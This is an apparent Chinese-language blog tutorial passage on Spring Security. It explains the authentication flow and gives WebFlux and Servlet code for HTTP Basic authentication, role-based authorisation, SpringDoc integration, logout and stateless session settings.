2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>它由四个重要的属性，<code>Authenticated</code>，是否已经通过认证；<code>Principal</code>，用户的身份，即能表示用户的标识，通常是用户名或用户 ID；<code>Credentials</code>，用户的凭证，即能验证用户身份的信息，通常是密码；<code>Authorities</code>，用户的权限，即用户能访问的资源。<code>Authorities</code>是一个<code>GrantedAuthority</code>的集合，<code>GrantedAuthority</code>是一个只有<code>getAuthority()</code>方法的接口，它只返回一个字符串，表示用户的权限。因此，可以认为<code>Authorities</code>本质就是一些字符串，它们可以表示用户的权限。</p>
<p>默认状态下，SecurityFilterChain 的认证流程如下。</p>
<ol>
<li>Filter 拦截请求。Filter 先根据特定的规则把 HTTP 请求处理成<code>Authentication</code>对象。这时对象的<code>Authenticated</code>属性为<code>false</code>。Filter 会把这个对象放在<code>SecurityContext</code>中。这个 Filter 是<code>AuthenticationFilter</code>或<code>AuthenticationWebFilter</code>。对于前者，在创建时要提交<code>AuthenticationManager</code>和一个<code>AuthenticationConverter</code>，它们分别负责认证和 HTTP 请求转 Authentication 对象。对于后者，只需要提交<code>ReactiveAuthenticationManager</code>，Converter 可以用回调函数设置。</li>
<li>Filter 把用户认证的任务委托给<code>AuthenticationManager</code>。<code>AuthenticationManager</code>会根据<code>Authentication</code>对象的<code>Principal</code>和<code>Credentials</code>进行认证。<code>authenticate</code>是<code>AuthenticationManager</code>的唯一一个方法，它接受一个<code>Authentication</code>对象，返回一个认证后的<code>Authentication</code>对象。</li>
<li><code>AuthenticationManager</code> Servlet 版本的默认实现是 <code>ProviderManager</code>，它会把认证任务委托给多个<code>AuthenticationProvider</code>。每个<code>AuthenticationProvider</code>负责一种认证方式，例如用户名密码认证、OAuth2 认证等。除了<code>authenticated</code>方法外，<code>AuthenticationProvider</code>还有一个<code>supports</code>方法，它的签名是<code>boolean supports(Class&lt;?&gt; authentication)</code>，用于判断这个<code>AuthenticationProvider</code>是否支持这种认证方式。默认的<code>ProviderManager</code>会遍历所有的<code>AuthenticationProvider</code>，找到第一个支持这种认证方式的<code>AuthenticationProvider</code>，然后调用它的<code>authenticate</code>方法。而 WebFlux 版本没有 ProviderManager，而是直接使用<code>UserDetailsRepositoryReactiveAuthenticationManager</code>，这比 Servlet 版本少了一层抽象。</li>
<li><code>AuthenticationProvider</code>会根据<code>SecurityContext</code>中<code>Authentication</code>对象的<code>Principal</code>和<code>Credentials</code>进行认证。如果认证成功，就返回一个认证后的<code>Authentication</code>对象；如果认证失败，就抛出一个异常。</li>
<li>默认的<code>AuthenticationProvider</code>是<code>DaoAuthenticationProvider</code>，它会根据用户名和密码从数据库中查询用户信息。它依赖于<code>UserDetailsService</code>，<code>UserDetailsService</code>是一个接口，它只有一个方法<code>UserDetails loadUserByUsername(String username)</code>，用于根据用户名查询用户信息。<code>UserDetails</code>是一个接口，它包含了用户的用户名、密码、权限等信息。<code>DaoAuthenticationProvider</code>会根据<code>UserDetailsService</code>查询到的<code>UserDetails</code>对象，和<code>Authentication</code>对象的<code>Credentials</code>进行比较，如果相同，就返回一个认证后的<code>Authentication</code>对象；如果不同，就抛出一个异常。此外，它还有一个<code>PasswordEncoder</code>属性，用于对密码进行加密。</li>
<li>认证成功后，<code>AuthenticationManager</code>会把认证后的<code>Authentication</code>对象存储到<code>SecurityContext</code>中。这时对象的<code>Authenticated</code>属性为<code>true</code>。</li>
<li>后续 Filter 根据<code>Authentication</code>对象的<code>Authorities</code>进行鉴权。</li>
</ol>
<p>这个过程一定要理解好，下面我们所有的配置都是基于这个过程的。我们一般只会改变<code>AuthenticationManager</code>，<code>UserDetailsService</code>，<code>PasswordEncoder</code>这三个类。</p>
<p>注意，上面的流程是基于 Servlet 的，对于 WebFlux，流程是一样的，但是 Filter 是 WebFilter，而且其它的接口名称都在开头添加了<code>Reactive</code>，例如<code>ReactiveAuthenticationManager</code>，接口从直接返回值变成返回<code>Mono</code>，但是其它的都是一样的。</p>
<p>此外，如果找不到<code>UserDetailsService</code>，即完全没经过 Security 配置，默认的<code>AuthenticationManager</code>逻辑是这样的：它会在配置文件里找<code>spring.security.user.name</code>和<code>spring.security.user.password</code>，如果找到了，就用这个用户名和密码进行认证。如果找不到，就会生成一个密码，打印在控制台上，然后用这个密码进行认证。这个密码是随机的，每次启动都不一样。用户名是<code>user</code>。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置-spring-security-进行-basic-认证与鉴权">配置 Spring Security 进行 Basic 认证与鉴权<a href="#配置-spring-security-进行-basic-认证与鉴权" class="hash-link" aria-label="Direct link to 配置 Spring Security 进行 Basic 认证与鉴权" title="Direct link to 配置 Spring Security 进行 Basic 认证与鉴权">​</a></h3>
<p>首先，我们要配置好 UserDetailsService，它用于根据用户名查询用户信息。这里我们就不连接数据库了，而是直接用 Map 存储用户信息。这里我们使用默认类。注意，非 WebFlux 版本没有 <code>MapUserDetailsManager</code>，需要自己实现。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PasswordEncoder passwordEncoder() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return new BCryptPasswordEncoder();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public ReactiveUserDetailsService reactiveUserDetailsService(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Autowired PasswordEncoder passwordEncoder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return new MapReactiveUserDetailsService(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        User.withUsername(&quot;user&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .password(passwordEncoder.encode(&quot;password&quot;))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .roles(&quot;USER&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .build(),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        User.withUsername(&quot;admin&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .password(passwordEncoder.encode(&quot;password&quot;))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .roles(&quot;ADMIN&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .build()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    );</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后配置 Filter。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public SecurityWebFilterChain securityWebFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServerHttpSecurity http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .httpBasic(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .authorizeExchange(exchanges -&gt; exchanges</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/public&quot;).permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/private&quot;).authenticated()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .anyExchange().permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里的配置很简单，<code>.httpBasic(Customizer.withDefaults())</code>表示使用 HTTP Basic 认证；<code>.authorizeExchange(exchanges -&gt; exchanges...</code>表示配置鉴权规则；<code>.csrf(csrf -&gt; csrf.disable())</code>表示关闭 CSRF 防护；<code>.cors(Customizer.withDefaults())</code>表示配置 CORS 规则。</p>
<p>其中，<code>pathMatchers</code>表示匹配路径，<code>permitAll</code>表示允许所有用户访问，<code>authenticated</code>表示只允许认证用户访问，<code>hasRole</code>表示只允许有某个角色的用户访问。</p>
<p>这里的<code>Role</code>匹配其实就是<code>GrantedAuthority</code>匹配，只不过 Spring Security 为了方便，提供了<code>hasRole</code>方法，它会自动加上<code>ROLE_</code>前缀。简单来说，为一个用户添加一个角色，就是为这个用户添加一个<code>GrantedAuthority</code>，这个<code>GrantedAuthority</code>的<code>getAuthority</code>方法返回的字符串就是<code>ROLE_</code>加上角色名。检查也是一样的，只要用户的<code>Authorities</code>中包含这个<code>GrantedAuthority</code>，就可以访问。</p>
<p>此外，还可以使用<code>access</code>表达式，它是一个 SpEL 表达式，用于判断用户是否有权限访问。里面的内容就是正常情况下的权限控制方法。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public SecurityWebFilterChain securityWebFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServerHttpSecurity http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .httpBasic(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .authorizeExchange(exchanges -&gt; exchanges</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/public&quot;).access(&quot;permitAll()&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/private&quot;).access(&quot;isAuthenticated()&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/admin&quot;).access(&quot;hasRole(&#x27;ADMIN&#x27;)&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>或者使用基于注解的方式。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@GetMapping(&quot;/private&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@PreAuthorize(&quot;isAuthenticated()&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public Mono&lt;String&gt; privateResource() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return Mono.just(&quot;Private resource&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里的<code>@PreAuthorize</code>是一个注解，它的值是一个 SpEL 表达式，用于判断用户是否有权限访问这个接口。里面的内容和 access 方法一致。</p>
<p>如果使用了 Spring Doc，先加上<code>@SecurityRequirement</code>注解，</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@GetMapping(&quot;/private&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@SecurityRequirement(name = &quot;basicAuth&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public Mono&lt;String&gt; privateResource() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return Mono.just(&quot;Private resource&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@GetMapping(&quot;/admin&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@SecurityRequirement(name = &quot;basicAuth&quot;, scopes = &quot;admin&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public Mono&lt;String&gt; adminResource() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return Mono.just(&quot;Admin resource&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后加上<code>@SecurityScheme</code>注解，</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package io.github.fingerbone;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.context.annotation.Configuration;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import io.swagger.v3.oas.annotations.enums.SecuritySchemeType;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import io.swagger.v3.oas.annotations.security.SecurityScheme;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@Configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@SecurityScheme(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    name = &quot;basicAuth&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    type = SecuritySchemeType.HTTP,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    scheme = &quot;basic&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class SpringDocConfig {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这样 Swagger 就会自动加上认证信息。每个有 Security 注解的接口都会有一个锁的图标，点击后会弹出认证框，输入用户名密码即可。</p>
<p>注意，默认 HTTP Basic 是有 Cookie 保持的。</p>
<p>进入浏览器的开发者工具，选择 Storage。在 All Storage 里删掉所有 Cookie 即可。</p>
<p>当然，更好的方法是添加一个登出接口，这样就可以在浏览器中登出了。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@GetMapping(&quot;/logout&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public Mono&lt;Void&gt; logout(ServerWebExchange exchange) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return exchange.getPrincipal().flatMap(principal -&gt; {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (principal instanceof Authentication) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return exchange.getExchange().getSession().doOnNext(WebSession::invalidate);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return Mono.empty();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    });</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>或者直接用 Spring Security 提供的<code>LogoutWebFilter</code>。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public SecurityWebFilterChain securityWebFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServerHttpSecurity http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .httpBasic(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .logout(logout -&gt; logout.logoutUrl(&quot;/logout&quot;))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .authorizeExchange(exchanges -&gt; exchanges</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/public&quot;).permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/private&quot;).authenticated()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .anyExchange().permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这样，访问<code>/logout</code>就会登出。</p>
<p>如果要关闭 Cookie，可以使用<code>securityContextRepository</code>，这个类用于存储<code>SecurityContext</code>。默认的实现是<code>WebSessionServerSecurityContextRepository</code>，它会把<code>SecurityContext</code>存储到<code>WebSession</code>中。我们可以使用<code>NoOpServerSecurityContextRepository</code>，它不会存储<code>SecurityContext</code>。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public SecurityWebFilterChain securityWebFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServerHttpSecurity http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .httpBasic(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .logout(logout -&gt; logout.logoutUrl(&quot;/logout&quot;))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .securityContextRepository(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                NoOpServerSecurityContextRepository.getInstance()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .authorizeExchange(exchanges -&gt; exchanges</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/public&quot;).permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/private&quot;).authenticated()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .anyExchange().permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果使用 Servlet 版本，使用的是<code>sessionManagement</code>。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public SecurityFilterChain securityFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    HttpSecurity http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .httpBasic(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .logout(logout -&gt; logout.logoutUrl(&quot;/logout&quot;))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .sessionManagement(sessionManagement -&gt; sessionManagement</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .authorizeRequests(authorizeRequests -&gt; authorizeRequests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .antMatchers(&quot;/resource/public&quot;).permitAll()</span><br></span><span 